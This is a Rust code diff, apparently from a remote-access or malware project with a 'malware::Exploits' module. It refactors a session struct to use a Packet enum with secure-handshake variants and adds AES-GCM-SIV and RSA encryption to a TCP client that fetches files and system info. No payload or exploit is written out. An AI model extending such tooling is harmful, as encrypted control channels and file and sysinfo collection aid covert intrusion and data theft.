@@ -2,8 +2,15 @@ use std::net::TcpStream;
 
 use crate::{
     malware::Exploits,
-    structure::structs::define::StructStone,
-    structure::traits::define::Detector,
+    structure::{
+        enums::Packet,
+        structs::define::StructStone,
+        traits::define::Detector,
+    },
+    utility::secure::{
+        crypto::Crypto,
+        utils::{AesGcmSivCrypto, RsaCrypto},
+    },
 };
 
 pub trait PacketProcessing {
@@ -14,20 +21,19 @@ pub trait PacketProcessing {
     fn set_packet<T>(&mut self, packet: T) -> T;
 }
 
-#[derive(Debug)]
 pub struct Session {
     use_encryption: bool,
     socket: TcpStream,
-    packet: StructStone,
+    packet: Packet,
+    aes_cipher: AesGcmSivCrypto,
+    rsa_cipher: RsaCrypto,
 }
 
-#[derive(Debug)]
 pub struct Client {
     pub session: Session,
     pub exploits: Exploits,
 }
 
-#[derive(Debug)]
 pub struct ProtocolEditor {
     session: Session,
     exploits: Exploits,
@@ -35,23 +41,27 @@ pub struct ProtocolEditor {
 
 
 impl Session {
-    pub fn take_packet(&self) -> &StructStone {
+    pub fn take_packet(&self) -> &Packet {
         &self.packet
     }
-
-    pub fn get_packet(&self) -> StructStone {
+    pub fn get_packet(&self) -> Packet {
         self.packet.clone()
     }
-
-    pub fn set_packet(&mut self, packet: StructStone) {
+    pub fn set_packet(&mut self, packet: Packet) {
         self.packet = packet
     }
-
     pub fn take_socket(&self) -> &TcpStream {
         &self.socket
     }
-    pub fn set(use_encryption: bool, socket: TcpStream, packet: StructStone) -> Session {
-        Session { use_encryption, socket, packet }
+    pub fn set(use_encryption: bool, socket: TcpStream, packet: Packet) -> Session {
+        match &packet {
+            Packet::StructStone { .. } |
+            Packet::SecureHandshakePacket { .. } |
+            Packet::SecurePacket { .. }
+            => {
+                Session { use_encryption, socket, packet, aes_cipher: AesGcmSivCrypto::new(), rsa_cipher: RsaCrypto::new() }
+            }
+        }
     }
     pub fn set_encryption(&mut self, use_encryption: bool) {
         self.use_encryption = use_encryption
@@ -63,7 +73,7 @@ impl Session {
 
 
 impl Client {
-    pub fn set_packet(&mut self, packet: StructStone) {
+    pub fn set_packet(&mut self, packet: Packet) {
         self.session.set_packet(packet)
     }
 
@@ -78,7 +88,7 @@ impl Client {
     }
 
     pub fn take_file(&self) -> &Vec<u8> {
-        &self.session.take_packet().take_file()
+        self.session.take_packet().take_file()
     }
 
     pub fn get_sysinfo(&self) -> Vec<u8> { self.session.take_packet().get_sysinfo() }
@@ -94,8 +104,9 @@ impl Client {
     pub fn get_file(&self) -> Vec<u8> {
         self.session.take_packet().get_file()
     }
-
     pub fn use_encrypt(&mut self, use_encryption: bool) {
+        self.session.aes_cipher.setup().expect("self.session.aes_cipher.setup()");
+        self.session.rsa_cipher.setup().expect("self.session.rsa_cipher.setup()");
         self.session.set_encryption(use_encryption)
     }
 }
